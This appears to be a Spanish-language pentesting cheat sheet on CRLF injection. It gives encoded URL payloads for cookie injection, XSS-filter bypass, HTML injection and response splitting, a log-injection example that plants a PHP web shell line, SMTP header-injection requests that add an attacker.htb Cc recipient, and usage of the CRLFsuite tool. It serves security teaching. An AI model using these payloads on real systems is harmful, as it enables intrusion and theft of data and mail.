# CRLF Injection

## Table of contents

- [CRLF Injection](#crlf-injection)
  - [Carriage Return Line Feed (CRLF)](#carriage-return-line-feed-crlf)
  - [IDENTIFICACION](#identificacion)
  - [Ataque](#ataque)
    - [CRLF - Añadir una cookie](#crlf---aadir-una-cookie)
    - [CRLF - Agregar una cookie - Omitir XSS](#crlf---agregar-una-cookie---omitir-xss)
  - [CRLF - Escribir HTML](#crlf---escribir-html)

## Carriage Return Line Feed (CRLF)

El término CRLF hace referencia a Retorno de carro (ASCII 13, \\r) Avance de línea (ASCII 10, \\n). Se utilizan para señalar la terminación de una línea:

Cuando un navegador envía una solicitud a un servidor web, el servidor web responde con una respuesta que contiene tanto los encabezados de respuesta HTTP como el contenido real del sitio web, es decir, el cuerpo de la respuesta. Los encabezados HTTP y la respuesta HTML (el contenido del sitio web) están separados por una combinación específica de caracteres especiales (**\\r\\n**)

El servidor web usa CRLF para comprender cuándo comienza un nuevo encabezado HTTP y finaliza otro. El CRLF también puede decirle a una aplicación web o a un usuario que comienza una nueva línea en un archivo o en un bloque de texto.

## IDENTIFICACION

Si burpsuite nos reporta o lo vemos manualmente que **una entrada que controlamos se refleja en los header** (sobretodo en las cookies) entonces podemos injectar cookies mediante **CRLF Injection**:

![[Pasted image 20230207225745.png]]

inyeccion de cookies:

![[Pasted image 20230207225857.png]]

burpsuite professional lo marca asi:

![[Pasted image 20230207230434.png]]

>[!tip]
>no necesariamente tiene que ser reflejado en las cookies, se considera CRLF injection si es que los caracteres `CR` y `LF` como un salto de linea en algiuna entrada reflejada que controlemos.

## Ataque

Un ataque de inyección CRLF ocurre cuando un usuario logra enviar un CRLF a una aplicación. Esto se suele hacer modificando un parámetro HTTP o una URL.

### CRLF - Añadir una cookie

Página solicitada

```http
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

Respuesta HTTP

```bash
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue #injection
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block`
```

**_La entrada controlable y reflejada es la URL que se refleja en la cookie location_**

### CRLF - Agregar una cookie - Omitir XSS

Página solicitada

```http
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

Respuesta HTTP

```bash
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

### CRLF - Injectar codigo HTML

Página solicitada

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

Respuesta HTTP

```bash
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

### Injeccion en logs de registro

una pagina permite enviar un correo electronico en el apartado de contacto, valida si en el input **mensaje** hay caracteres especiales que podrian representar un ataque, de ser asi lo registra en un archivo de logs (`/log.php`)

si enviamos un mensaje decente no hay alerta:

![[Pasted image 20230607230735.png]]

![[Pasted image 20230607230810.png]]

de enviar algun caracter raro sale el siguiente mensaje:

![[Pasted image 20230607230859.png]]

si verificamos los logs:

![[Pasted image 20230607230924.png]]

podemos probar de inyectar CRLF para ver si en los logs creaos un salto de linea:

```bash
#crearemos un registro falso
message=hola'%0D%0AMalicious+message+from+hacker+(127.0.0.1):+test
```

![[Pasted image 20230607231624.png]]

se refleja el salto de linea y nuestro contenido, eso quiere decir que interpreta el **CRLF**.

como se almacena en un archivo PHP (`log.php`), podemos colocar codigo php para lograr RCE:

```php
<?php system($_GET['cmd']); ?>

system($_GET['cmd']);
```

### HTTP Response Splitting

es una vulnerabilidad grave que surge cuando los servidores web reflejan la entrada del usuario en los headers HTTP sin la desinfección adecuada. Dado que los headers HTTP están separados solo por caracteres de nueva línea, una inyección de la secuencia de caracteres CRLF sale del headers HTTP previsto y permite que un atacante agregue más headers HTTP arbitrarios e incluso manipule la respuesta. Esto puede conducir a vulnerabilidades XSS reflejadas.

imagine una pagina donde hay un input que pide una URL a donde redireccionar y ese valor se lo refleja en el header `Location: <input>`:

![[Pasted image 20230608000438.png]]

![[Pasted image 20230608000519.png]]

como controlamos la entrada, podemos intentar la inyeccion CRLF:

```bash
https%3A%2F%2Fwww.google.com%0d%0atest:+test1
```

![[Pasted image 20230608000640.png]]

veos que esposible colocar un salto de linea y agregar mas headers, ademas podriamos agregar como un body con un XSS:

```bash
https%3A%2F%2Fwww.google.com%0d%0a%0d%0a<html><script>alert(1)</script></html>
```

![[Pasted image 20230608001216.png]]

En este caso, el navegador lee el header `Location` y redirige al usuario a la nueva ubicación sin siquiera ejecutar nuestra carga maliciosa XSS. Afortunadamente para nosotros, hay una solución fácil para esto. Simplemente podemos proporcionar un header `Location` vacío:

![[Pasted image 20230608001418.png]]

### CRLF  en SMTP Headers

Es una vulnerabilidad que permite a los atacantes inyectar headers SMTP. El [Protocolo simple de transferencia de correo (SMTP)](https://www.rfc-editor.org/rfc/rfc5321) se utiliza para enviar correos electrónicos. Similar a HTTP, un mensaje SMTP consta de una sección de headers y una sección de body. Los headers SMTP están separados por líneas nuevas al igual que los headers HTTP. Como tal, la inyección de headers SMTP es la inyección de headers en un mensaje SMTP.

Echemos un vistazo a un correo electrónico de ejemplo simple:

```smtp
From: webmaster@smtpinjection.htb
To: admin@smtpinjection.htb
Cc: anotherrecipient@test.htb
Date: Thu, 26 Oct 2006 13:10:50 +0200
Subject: Testmail
  
Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua.  
```

Aquí hay una breve lista de algunos encabezados SMTP importantes y su significado:

-   `From`: contiene el remitente
-   `To`: contiene un solo destinatario o una lista de destinatarios
-   `Subject`: contiene el título del correo electrónico
-   `Reply-To`: contiene la dirección de correo electrónico a la que el destinatario debe responder
-   `Cc`: contiene destinatarios que reciben una copia al carbón del correo electrónico
-   `Bcc`: contiene destinatarios que reciben una copia oculta del correo electrónico

**_Es posible que un formulario de contacto nos permita enviar un correo electronico con un mensaje, nos pida un campo de email y ese valor se reflejpo en el header `From`._**

En una implementación real de una aplicación web vulnerable, a menudo no tenemos acceso al correo electrónico resultante, por lo que no podemos confirmar si nuestro header se inyectó correctamente o no. Nuestro primer intento de explotación podría ser agregarnos como destinatarios del correo electrónico. Si recibimos el correo electrónico, sabemos que inyectamos con éxito un header SMTP. Podemos hacer esto dirigiéndonos a uno de los siguientes headers SMTP: `To`,  `Cc` o `Bcc`. Podemos inyectar nuestra propia dirección de correo electrónico en el header para obligar al servidor SMTP a enviarnos el correo electrónico:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 107
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil@attacker.htb%0d%0aCc:%20evil@attacker.htb&phone=123456789&message=Hello+Admin%21
```

En algunos casos, la aplicación puede agregar datos adicionales a nuestro punto de inyección. Considere un escenario en el que proporcionamos un nombre y se refleja en el `Subject`header para formar la siguiente línea: `You received a message from <name>!`. En este caso, se agrega un signo de exclamación a nuestra entrada. Si ahora intentamos inyectar un header `Cc` que contenga nuestra dirección de correo electrónico, la aplicación web agregará el signo de exclamación a nuestra dirección de correo electrónico y, por lo tanto, la invalidará. Por lo tanto, se recomienda inyectar siempre un header ficticio adicional después de nuestra carga real para evitar problemas de este tipo.

```http
POST /contact.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 151
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil%40attacker.htb%0d%0aCc:%20evil@attacker.htb%0d%0aDummyheader:%20abc&phone=123456789&message=Hello+Admin%21
```

## Herramientas

- [https://github.com/Nefcore/CRLFsuite](https://github.com/Nefcore/CRLFsuite)

```bash
#instalacion
pip3 install crlfsuite
```

```bash
crlfsuite -t http://127.0.0.1:8000/?target=asd
```

![[Pasted image 20230512162122.png]]